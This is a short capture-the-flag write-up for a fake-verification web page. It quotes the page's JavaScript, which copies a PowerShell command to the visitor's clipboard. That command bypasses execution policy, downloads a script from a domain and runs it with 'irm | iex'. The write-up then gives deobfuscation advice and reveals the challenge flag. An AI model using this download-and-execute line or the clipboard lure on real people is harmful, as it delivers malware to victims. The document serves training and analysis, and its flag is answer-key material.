# Solution

From the URL given, inspect the js code, you will see a text being copy to clipboard.
```const commandToRun = `powershell -NoP -Ep Bypass -c irm ${domain}/verify | iex`;```

Another few powershell commands will appear after running the  command above.

To deobfuscate/decode the following powershell, just run it without using `IEX`. 

The final powershell command will execute:
`[System.Environment]::SetEnvironmentVariable("flag", "flag{737450a28f36e1fd808e4ed99f2d81e0}", "Process")`

Flag: `flag{737450a28f36e1fd808e4ed99f2d81e0}`
